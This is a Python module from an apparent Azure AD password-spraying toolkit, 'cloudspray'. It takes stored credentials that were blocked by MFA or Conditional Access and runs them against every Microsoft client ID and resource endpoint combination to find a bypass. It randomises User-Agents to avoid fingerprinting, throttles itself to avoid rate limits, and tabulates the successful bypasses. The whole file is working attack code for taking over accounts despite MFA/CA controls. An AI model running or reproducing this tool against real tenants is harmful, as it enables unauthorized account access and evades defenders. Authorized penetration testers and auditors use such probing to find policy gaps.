"""Conditional Access policy gap detection via brute-force probing.

Conditional Access (CA) policies in Azure AD can restrict sign-ins based on
the client application, resource endpoint, device platform, location, and
other signals. However, many organizations only configure CA policies for
common scenarios (e.g. blocking browser logins) while leaving gaps for
less-common client/endpoint combinations.

This module tests every combination of Microsoft client ID and resource
endpoint against credentials that are blocked by MFA or CA policies. If
any combination returns SUCCESS or MFA_ENROLLMENT instead of the expected
CA block, that path bypasses the restriction.

The approach is similar to tools like MFASweep: systematically probe the
CA policy surface to find exploitable gaps.

A random User-Agent is selected for each attempt to reduce fingerprinting,
and a short delay is added between attempts to avoid Azure AD rate limiting.
"""

import logging
import random
import time

import msal
import requests
from rich.table import Table
from rich.text import Text

from cloudspray.constants import ALL_CLIENT_IDS, ENDPOINTS, USER_AGENTS, AuthResult
from cloudspray.reporting.console import ConsoleReporter
from cloudspray.spray.classifier import classify_auth_result
from cloudspray.state.db import StateDB

logger = logging.getLogger(__name__)

# Results indicating the CA policy did NOT block access -- these are the
# outcomes we are looking for during probing.
BYPASS_RESULTS = {
    AuthResult.SUCCESS,
    AuthResult.VALID_PASSWORD_MFA_ENROLLMENT,
}

# Delay between probe attempts to stay under Azure AD rate limiting thresholds.
PROBE_DELAY_SECONDS = 0.5


class CAProbe:
    """Probe for gaps in Conditional Access policies.

    For valid credentials blocked by MFA or CA, tests every combination of
    client_id x endpoint to find paths that bypass CA restrictions.
    A random user agent is selected per attempt to reduce fingerprinting.

    Similar to MFASweep's approach.
    """

    def __init__(self, domain: str, db: StateDB, reporter: ConsoleReporter):
        """Initialize the CA probe.

        Args:
            domain: Target Azure AD domain (e.g. "contoso.com").
            db: State database for reading valid credentials.
            reporter: Console reporter for status and results output.
        """
        self._domain = domain
        self._authority = f"https://login.microsoftonline.com/{domain}"
        self._db = db
        self._reporter = reporter

    def probe_user(self, username: str, password: str) -> list[dict]:
        """Test all client_id x endpoint combinations for one user.

        Returns list of dicts describing each successful bypass:
        [{"client_id": ..., "client_name": ..., "endpoint": ...,
          "result": AuthResult, "user_agent": ...}]
        """
        bypasses: list[dict] = []
        tenant_slug = self._domain.split(".")[0]

        total_combos = len(ALL_CLIENT_IDS) * len(ENDPOINTS)
        self._reporter.info(
            f"Probing CA for {username}: {total_combos} combinations"
        )

        http_session = requests.Session()

        for client_name, client_id in ALL_CLIENT_IDS.items():
            for endpoint_name, endpoint_url in ENDPOINTS.items():
                resource_url = endpoint_url.replace("{tenant}", tenant_slug)
                scope = [f"{resource_url}/.default"]

                user_agent = random.choice(USER_AGENTS)
                http_session.headers["User-Agent"] = user_agent

                app = msal.PublicClientApplication(
                    client_id,
                    authority=self._authority,
                    http_client=http_session,
                )

                try:
                    result = app.acquire_token_by_username_password(
                        username, password, scopes=scope
                    )
                except Exception as exc:
                    logger.debug(
                        "CA probe error: client=%s endpoint=%s error=%s",
                        client_name, endpoint_name, exc,
                    )
                    time.sleep(PROBE_DELAY_SECONDS)
                    continue

                auth_result, error_code = classify_auth_result(result)

                if auth_result in BYPASS_RESULTS:
                    bypass_info = {
                        "client_id": client_id,
                        "client_name": client_name,
                        "endpoint": endpoint_name,
                        "result": auth_result,
                        "user_agent": user_agent,
                    }
                    bypasses.append(bypass_info)
                    self._reporter.info(
                        f"  CA BYPASS: {client_name} + {endpoint_name} -> {auth_result.value}"
                    )

                time.sleep(PROBE_DELAY_SECONDS)

        http_session.close()

        self._reporter.info(
            f"CA probe for {username}: {len(bypasses)} bypass(es) found"
        )
        return bypasses

    def probe_all_blocked(self) -> dict[str, list[dict]]:
        """Probe all users with MFA_REQUIRED or CA_BLOCKED results.

        Returns dict mapping username to list of bypass paths found.
        """
        blocked_results = {
            AuthResult.VALID_PASSWORD_MFA_REQUIRED,
            AuthResult.VALID_PASSWORD_CA_BLOCKED,
        }

        valid_creds = self._db.get_valid_credentials()
        blocked_creds = [
            cred for cred in valid_creds
            if cred.result in blocked_results
        ]

        if not blocked_creds:
            self._reporter.info("No MFA/CA-blocked credentials to probe")
            return {}

        self._reporter.info(
            f"Starting CA probe for {len(blocked_creds)} blocked credential(s)"
        )

        results: dict[str, list[dict]] = {}
        for cred in blocked_creds:
            bypasses = self.probe_user(cred.username, cred.password)
            results[cred.username] = bypasses

        return results

    def print_matrix(self, results: dict[str, list[dict]]) -> None:
        """Print a Rich table showing the CA probe matrix.

        Columns: Username, Client ID, Endpoint, Result, User Agent
        Color-coded: green for bypasses, red for blocks.
        """
        if not results:
            self._reporter.info("No CA probe results to display")
            return

        table = Table(title="Conditional Access Probe Results", show_lines=True)
        table.add_column("Username", style="cyan", no_wrap=True)
        table.add_column("Client App", style="white")
        table.add_column("Endpoint", style="white")
        table.add_column("Result", justify="center")
        table.add_column("User Agent", style="dim", max_width=40)

        for username, bypasses in results.items():
            if not bypasses:
                table.add_row(
                    username,
                    "-",
                    "-",
                    Text("No bypasses found", style="red"),
                    "-",
                )
                continue

            for entry in bypasses:
                result = entry["result"]
                if result == AuthResult.SUCCESS:
                    result_text = Text("SUCCESS", style="bold green")
                elif result == AuthResult.VALID_PASSWORD_MFA_ENROLLMENT:
                    result_text = Text("MFA ENROLLMENT", style="bold green")
                else:
                    result_text = Text(result.value, style="red")

                table.add_row(
                    username,
                    entry["client_name"],
                    entry["endpoint"],
                    result_text,
                    entry.get("user_agent", "")[:40],
                )

        self._reporter.console.print()
        self._reporter.console.print(table)
